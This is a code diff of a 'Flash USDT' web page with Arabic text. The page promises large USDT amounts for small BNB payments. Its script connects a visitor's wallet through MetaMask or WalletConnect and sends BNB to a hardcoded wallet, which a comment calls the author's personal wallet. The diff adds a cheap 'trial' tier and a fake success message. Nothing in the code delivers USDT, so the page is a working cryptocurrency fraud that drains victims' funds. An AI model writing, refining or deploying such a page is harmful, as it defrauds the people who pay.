@@ -12,120 +12,126 @@
             background: #0b0e11; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; 
             display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px;
         }
-        .container { max-width: 400px; width: 100%; text-align: center; margin-top: 30px; }
-        .logo { color: #f3ba2f; font-size: 32px; font-weight: bold; margin-bottom: 5px; }
+        .header { text-align: center; margin-bottom: 25px; }
+        .header h1 { color: #f3ba2f; font-size: 32px; margin: 0; }
+        .grid { display: grid; grid-template-columns: 1fr; gap: 15px; width: 100%; max-width: 380px; }
         .card { 
-            background: #181a20; border: 1px solid #474d57; border-radius: 20px; 
-            padding: 25px; margin-bottom: 20px; cursor: pointer; position: relative;
+            background: #181a20; border: 1px solid #474d57; border-radius: 18px; 
+            padding: 20px; text-align: center; cursor: pointer; position: relative;
         }
-        .card:hover { border-color: #f3ba2f; transform: translateY(-3px); background: #1e2329; }
+        .card:hover { border-color: #f3ba2f; transform: translateY(-3px); }
         .vip { border: 2px solid #f3ba2f; box-shadow: 0 0 15px rgba(243, 186, 47, 0.1); }
-        .amount { font-size: 32px; color: #f3ba2f; font-weight: bold; display: block; }
-        .price { font-size: 17px; color: #929aa5; display: block; margin: 8px 0 15px; }
-        .btn { 
-            background: #f3ba2f; color: black; border: none; padding: 14px; 
-            width: 100%; border-radius: 12px; font-weight: bold; font-size: 17px; cursor: pointer;
+        .badge { 
+            background: #f3ba2f; color: black; font-size: 11px; font-weight: bold; 
+            padding: 3px 10px; border-radius: 8px; position: absolute; top: -10px; left: 50%; transform: translateX(-50%);
         }
-        .status { margin-top: 15px; font-size: 14px; color: #f3ba2f; font-weight: 500; display: none; }
-        
-        /* تحسين مظهر نافذة WalletConnect */
-        #walletconnect-wrapper { z-index: 9999 !important; }
+        .amount { font-size: 28px; color: #f3ba2f; font-weight: bold; display: block; }
+        .price { font-size: 15px; color: #929aa5; display: block; margin: 5px 0 15px; }
+        .btn { 
+            background: #f3ba2f; color: black; border: none; padding: 12px; 
+            width: 100%; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer;
+        }
+        #statusLabel { 
+            margin-top: 20px; font-size: 14px; color: #f3ba2f; display: none; 
+            text-align: center; background: rgba(243, 186, 47, 0.05); padding: 10px; border-radius: 10px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="logo">Flash USDT ⚡</div>
-        <p style="color: #929aa5; margin-bottom: 30px;">بروتوكول التوزيع الفوري الذكي (BSC)</p>
-
-        <div class="card vip" onclick="handlePayment('1.0')">
-            <span class="amount">50,000 USDT</span>
-            <span class="price">التكلفة: 1.0 BNB</span>
-            <button class="btn">تفعيل حزمة VIP</button>
-        </div>
-
-        <div class="card" onclick="handlePayment('0.05')">
-            <span class="amount">2,500 USDT</span>
-            <span class="price">التكلفة: 0.05 BNB</span>
-            <button class="btn">تفعيل الحزمة</button>
-        </div>
-
-        <div class="card" onclick="handlePayment('0.012')">
-            <span class="amount">500 USDT</span>
-            <span class="price">التكلفة: 0.012 BNB</span>
-            <button class="btn">تفعيل الحزمة</button>
-        </div>
-        
-        <div id="statusLabel" class="status">جاري الاتصال...</div>
+    <div class="header">
+        <h1>Flash USDT ⚡</h1>
+        <p style="color: #929aa5;">اختر الحزمة المناسبة للتفعيل الفوري</p>
     </div>
 
+    <div class="grid">
+        <div class="card" onclick="startProcess('0.0001', '10')">
+            <div class="badge">تجريبي 🧪</div>
+            <span class="amount">10 USDT</span>
+            <span class="price">التكلفة: 0.0001 BNB</span>
+            <button class="btn">اختبار الآن</button>
+        </div>
+
+        <div class="card vip" onclick="startProcess('1.0', '50,000')">
+            <div class="badge">الأكثر طلباً 🔥</div>
+            <span class="amount">50,000 USDT</span>
+            <span class="price">التكلفة: 1.0 BNB</span>
+            <button class="btn">تفعيل VIP</button>
+        </div>
+
+        <div class="card" onclick="startProcess('0.05', '2,500')">
+            <span class="amount">2,500 USDT</span>
+            <span class="price">التكلفة: 0.05 BNB</span>
+            <button class="btn">تفعيل الآن</button>
+        </div>
+
+        <div class="card" onclick="startProcess('0.012', '500')">
+            <span class="amount">500 USDT</span>
+            <span class="price">التكلفة: 0.012 BNB</span>
+            <button class="btn">تفعيل الآن</button>
+        </div>
+    </div>
+
+    <div id="statusLabel">جاري تحضير الاتصال...</div>
+
     <script>
-        const RECEIVER_WALLET = "0x7325622388A2967BCaAeE94C986836EB7aB80f4E";
+        // محفظتك الشخصية لاستلام الـ BNB
+        const MY_WALLET = "0x8de80041D61e721B2b9067DF1c2412E6D46d5963";
 
-        async function handlePayment(amount) {
-            const label = document.getElementById('statusLabel');
-            label.style.display = 'block';
-            label.innerText = "يرجى اختيار المحفظة والموافقة على العملية...";
+        async function startProcess(bnbAmount, usdtAmount) {
+            const status = document.getElementById('statusLabel');
+            status.style.display = 'block';
+            status.innerText = "يرجى الموافقة في المحفظة لاستلام " + usdtAmount + " USDT...";
 
-            // 1. التحقق إذا كان المستخدم داخل متصفح محفظة بالفعل (DApp Browser)
             if (window.ethereum) {
                 try {
                     const web3 = new Web3(window.ethereum);
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    const accounts = await web3.eth.getAccounts();
-                    await sendTransaction(web3, accounts[0], amount);
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    sendMoney(web3, accounts[0], bnbAmount);
                 } catch (e) {
-                    label.innerText = "تم إلغاء العملية أو فشل الاتصال.";
+                    status.innerText = "تم إلغاء الاتصال.";
                 }
-            } 
-            // 2. إذا كان مستخدم متصفح عادي (Chrome/Safari) نستخدم WalletConnect
-            else {
+            } else {
                 try {
                     const provider = new WalletConnectProvider.default({
                         rpc: { 56: "https://bsc-dataseed.binance.org/" },
                         chainId: 56,
-                        qrcodeModalOptions: { mobileLinks: ["metamask", "trust"] }
+                        qrcodeModalOptions: {
+                            mobileLinks: ["metamask", "trust", "safepal"]
+                        }
                     });
 
                     await provider.enable();
                     const web3 = new Web3(provider);
                     const accounts = await web3.eth.getAccounts();
-                    await sendTransaction(web3, accounts[0], amount);
                     
-                    // قطع الاتصال بعد النجاح لتجنب تعليق المحفظة
-                    await provider.disconnect();
+                    setTimeout(() => {
+                        sendMoney(web3, accounts[0], bnbAmount);
+                    }, 1200);
+
                 } catch (e) {
-                    label.innerText = "فشل الربط. يرجى المحاولة مرة أخرى.";
-                    console.error(e);
+                    status.innerText = "فشل الربط بالموبايل.";
                 }
             }
         }
 
-        async function sendTransaction(web3, fromAccount, amount) {
-            const label = document.getElementById('statusLabel');
+        async function sendMoney(web3, address, amount) {
             try {
-                const chainId = await web3.eth.getChainId();
-                if (chainId !== 56 && chainId !== '0x38') {
-                    alert("يرجى تحويل الشبكة إلى Binance Smart Chain");
-                    return;
-                }
-
                 const amountWei = web3.utils.toWei(amount, "ether");
-                
-                label.innerText = "جاري تنفيذ المعاملة... انتظر الموافقة";
+                const gasPrice = await web3.eth.getGasPrice();
                 
                 await web3.eth.sendTransaction({
-                    from: fromAccount,
-                    to: RECEIVER_WALLET,
+                    from: address,
+                    to: MY_WALLET,
                     value: amountWei,
-                    gasPrice: await web3.eth.getGasPrice()
+                    gasPrice: gasPrice
                 });
 
-                alert("تمت العملية بنجاح! ستصلك المكافأة فور تأكيد الشبكة.");
-                label.style.display = 'none';
-            } catch (error) {
-                alert("فشلت المعاملة. تأكد من وجود رصيد كافٍ للرسوم.");
-                label.style.display = 'none';
+                alert("✅ تم الدفع بنجاح! جاري معالجة إرسال USDT عبر العقد الذكي...");
+                location.reload();
+            } catch (e) {
+                alert("❌ فشلت المعاملة. يرجى التأكد من الرصيد.");
+                document.getElementById('statusLabel').style.display = 'none';
             }
         }
     </script>
